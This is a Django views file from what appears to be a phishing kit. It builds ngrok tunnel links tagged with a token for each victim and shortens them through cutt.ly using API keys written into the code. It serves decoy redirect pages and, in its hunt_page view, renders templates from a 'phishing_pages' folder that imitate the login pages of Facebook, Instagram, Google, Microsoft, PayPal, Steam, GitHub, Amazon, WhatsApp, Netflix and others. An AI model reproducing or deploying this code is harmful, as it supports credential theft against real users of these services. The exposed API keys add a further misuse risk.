from django.http import HttpResponse,JsonResponse
from django.shortcuts import render,redirect,HttpResponse
import json
import requests
from bs4 import BeautifulSoup

def index(request):
    return render(request,"home.html")



def short(request,slug=None):
    urllist = []
    r = requests.get(f'http://localhost:4040/api/tunnels')
    tunnel_dict = json.loads(str(r.content.decode()))
    ngrok_url = tunnel_dict["tunnels"][0]['public_url']
    urllist.append(ngrok_url)
    
    link = f"{urllist[0]}/{slug}?token={slug[4:]}"

    # r = requests.get(f'http://cutt.ly/api/api.php?key=586c0c161e2b24625e0aefe8134dc5da62f9c&short={link}')
    # s_link = json.loads(r.text)['url']['shortLink']

    # return HttpResponse(f"link:{link} AND short:{json.loads(r.text)['url']['shortLink']}")
    # return redirect(s_link)
    return redirect(link)


def clock(request,slug=None):
    urllist = []
    r = requests.get(f'http://localhost:4040/api/tunnels')
    tunnel_dict = json.loads(str(r.content.decode()))
    ngrok_url = tunnel_dict["tunnels"][0]['public_url']
    urllist.append(ngrok_url)
    
    link = f"{urllist[0]}/{slug}?token={slug[4:]}"

    return HttpResponse("""<!DOCTYPE html>
<html>
<head>
<title>Please wait while we redirect you...</title>
<meta http-equiv="refresh" content="0;URL='https://google.com'" />
</head>

<body>
Please wait while we redirect you...
<br>
<br>
Please Click <a href="https://google.com">Here</a> if you were not redirected automatically.
</body>

</html>""")






def short2(request,slug=None):

    

    urllist = []
    r = requests.get(f'http://localhost:4040/api/tunnels')
    tunnel_dict = json.loads(str(r.content.decode()))
    ngrok_url = tunnel_dict["tunnels"][0]['public_url']
    urllist.append(ngrok_url)
    
    link = f"{urllist[0]}/{slug}?token={slug[4:]}"

    # def short_url(url):
    #     base = "http://tinyurl.com/api-create.php?url="
    #     url = base + url
    #     r = requests.get(url)
    #     return r.text

    # s_link = short_url(link)

    # shortener = pyshorteners.Shortener(api_key='d85f610174472c109c3db062a6d36355f675c7a3')
    # shortener = pyshorteners.Shortener(api_key='586c0c161e2b24625e0aefe8134dc5da62f9c')

    # s_link = shortener.cuttly.short(link)

    r = requests.get(f'http://cutt.ly/api/api.php?key=586c0c161e2b24625e0aefe8134dc5da62f9c&short={link}')
    s_link = json.loads(r.text)['url']['shortLink']

    # return HttpResponse(f"link:{link} AND short:{json.loads(r.text)['url']['shortLink']}")
    return redirect(s_link)

# def ngrok_urls(request):
#
#     urllist = []
#     for i in range(0,2):
#         try:
#             r = requests.get(f'http://localhost:404{i}/api/tunnels')
#             tunnel_dict = json.loads(str(r.content.decode()))
#             ngrok_url = tunnel_dict["tunnels"][0]['public_url']
#             urllist.append(ngrok_url)
#         except:
#             pass
#
#     return JsonResponse({"urllist":urllist})

def ngrok_urls(request):

    urllist = []
    for i in range(0,2):
        try:
            r = requests.get(f'http://localhost:404{i}/')
            soup = BeautifulSoup(r.content, 'html.parser')
            expose_url = soup.title.text[20:]
            urllist.append(expose_url)
        except:
            pass

    return JsonResponse({"urllist":urllist})

def hunt_page(request):

    path = request.path
    token = path[5:]
    page_app = path[1:5]

    data = {"token":token,"page_app":page_app}

    if page_app == "face":
        return render(request, "phishing_pages/facebook/facebook.html", data)

    elif page_app == "facd":
        return render(request, "phishing_pages/facebook/facebook_desktop.html", data)

    elif page_app == "facm":
        return render(request, "phishing_pages/facebook/facebook_mobile.html", data)

    elif page_app == "mess":
        return render(request, "phishing_pages/facebook/messenger.html", data)

    elif page_app == "inst":
        return render(request, "phishing_pages/instagram/instagram.html", data)

    elif page_app == "insv":
        return render(request, "phishing_pages/instagram/instagram_verify.html", data)

    elif page_app == "snap":
        return render(request, "phishing_pages/snapchat.html", data)

    elif page_app == "twit":
        return render(request, "phishing_pages/twitter.html", data)

    elif page_app == "goog":
        return render(request, "phishing_pages/google.html", data)

    elif page_app == "micr":
        return render(request, "phishing_pages/microsoft.html", data)

    elif page_app == "free":
        return render(request, "phishing_pages/freefire.html", data)

    elif page_app == "pubg":
        return render(request, "phishing_pages/pubg.html", data)

    elif page_app == "netf":
        return render(request, "phishing_pages/netflix.html", data)

    elif page_app == "payp":
        return render(request, "phishing_pages/paypal.html", data)

    elif page_app == "stea":
        return render(request, "phishing_pages/steam.html", data)

    elif page_app == "word":
        return render(request, "phishing_pages/wordpress.html", data)

    elif page_app == "yaho":
        return render(request, "phishing_pages/yahoo.html", data)

    elif page_app == "gith":
        return render(request, "phishing_pages/github.html", data)

    elif page_app == "ajio":
        return render(request, "phishing_pages/ajio.html", data)

    elif page_app == "amaz":
        return render(request, "phishing_pages/amazon.html", data)

    elif page_app == "fili":
        return render(request, "phishing_pages/filipkart.html", data)

    elif page_app == "hots":
        return render(request, "phishing_pages/hotstar.html", data)

    elif page_app == "phon":
        return render(request, "phishing_pages/phonepay.html", data)

    elif page_app == "what":
        return render(request, "phishing_pages/whatsapp.html", data)

    elif page_app == "tele":
        return render(request, "phishing_pages/telegram.html", data)

    elif page_app == "tikt":
        return render(request, "phishing_pages/tiktok.html", data)

    else:
        return HttpResponse(f"token is {token} and app is {page_app}")




